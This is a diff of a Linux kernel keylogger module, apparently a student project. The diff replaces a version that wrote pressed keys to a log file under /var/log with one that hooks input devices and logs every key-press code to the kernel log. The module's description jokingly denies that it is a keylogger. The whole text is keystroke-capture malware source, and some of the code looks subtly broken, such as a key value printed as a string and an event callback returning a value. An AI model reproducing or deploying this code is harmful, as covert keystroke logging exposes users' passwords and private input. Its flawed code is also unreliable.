@@ -2,67 +2,67 @@
 #include <linux/kernel.h>
 #include <linux/init.h>
 #include <linux/input.h>
-#include <linux/notifier.h>
-#include <linux/fs.h>
-#include <linux/uaccess.h>
 
-#define LOGFILE "/var/log/keylogger.log"
-
+static struct input_handler keylogger_handler;
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("281443-279460");
 MODULE_DESCRIPTION("is definitly not keylogger");
 MODULE_VERSION("1.0");
 
-
-
-
-static int keylogger_notifier(struct notifier_block *nblock, unsigned long code, void *data);
-
-
-static struct notifier_block keylogger_nb = {
-    .notifier_call = keylogger_notifier,
-};
-
-
-static int keylogger_notifier(struct notifier_block *nblock, unsigned long code, void *data) {
-    struct keyboard_notifier_param *param = data;
-
-    if (code == KBD_KEYSYM && param->down) { 
-        char log_entry[64];
-        struct file *log_file;
-        mm_segment_t old_fs;
-
-        snprintf(log_entry, sizeof(log_entry), "Pressed: %s\n", param->value);
-        
-        old_fs = get_fs();
-        set_fs(KERNEL_DS); 
-        
-        log_file = filp_open(LOGFILE, O_WRONLY | O_CREAT | O_APPEND, 0644);
-        if (!IS_ERR(log_file)) {
-            vfs_write(log_file, log_entry, strlen(log_entry), &log_file->f_pos);
-            filp_close(log_file, NULL);
-        }
-
-        set_fs(old_fs); 
+static bool keylogger_event(struct input_handle *handle, unsigned int type, unsigned int code, int value) {
+    if (type == EV_KEY && value == 1) { // Zdarzenie klawisza (naciśnięcie)
+        printk(KERN_INFO "Key pressed: %u\n", code);
     }
-    return NOTIFY_OK;
+    return true;
 }
 
+static int keylogger_connect(struct input_handler *handler, struct input_dev *dev, const struct input_device_id *id) {
+    struct input_handle *handle;
 
-static int __init keylogger_init(void) {
-    printk(KERN_INFO "Keylogger module loaded\n");
-    register_keyboard_notifier(&keylogger_nb);
+    handle = kzalloc(sizeof(struct input_handle), GFP_KERNEL);
+    if (!handle)
+        return -ENOMEM;
+
+    handle->dev = dev;
+    handle->handler = handler;
+    handle->name = "keylogger";
+
+    input_register_handle(handle);
+    input_open_device(handle);
+
     return 0;
 }
 
-// Funkcja czyszcząca moduł
+static void keylogger_disconnect(struct input_handle *handle) {
+    input_close_device(handle);
+    input_unregister_handle(handle);
+    kfree(handle);
+}
+
+static const struct input_device_id keylogger_ids[] = {
+    { .driver_info = 1 },
+    { },
+};
+
+MODULE_DEVICE_TABLE(input, keylogger_ids);
+
+static struct input_handler keylogger_handler = {
+    .event = keylogger_event,
+    .connect = keylogger_connect,
+    .disconnect = keylogger_disconnect,
+    .name = "keylogger",
+    .id_table = keylogger_ids,
+};
+
+static int __init keylogger_init(void) {
+    return input_register_handler(&keylogger_handler);
+}
+
 static void __exit keylogger_exit(void) {
-    unregister_keyboard_notifier(&keylogger_nb);
-    printk(KERN_INFO "Keylogger module unloaded\n");
+    input_unregister_handler(&keylogger_handler);
 }
 
 module_init(keylogger_init);
 module_exit(keylogger_exit);
-
 
